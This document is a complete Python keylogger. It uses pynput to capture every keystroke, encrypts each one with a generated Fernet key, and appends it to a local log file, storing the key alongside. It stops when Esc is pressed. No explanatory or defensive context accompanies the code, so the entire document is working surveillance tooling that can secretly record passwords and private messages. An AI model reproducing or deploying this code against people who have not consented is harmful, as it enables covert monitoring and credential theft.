from pynput import keyboard
from cryptography.fernet import Fernet

# Generate a key for encryption
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# Define the file to save the logs
log_file = "encrypted_key_log.txt"
key_file = "key.key"

# Save the encryption key to a file
with open(key_file, "wb") as kf:
    kf.write(key)

# Function to write encrypted keystrokes to the log file
def write_to_file(encrypted_data):
    with open(log_file, "ab") as f:
        f.write(encrypted_data + b'\n')

# Function to handle key press events
def on_press(key):
    try:
        data = str(key.char).encode()
    except AttributeError:
        data = str(key).encode()
    encrypted_data = cipher_suite.encrypt(data)
    write_to_file(encrypted_data)

# Function to handle key release events
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
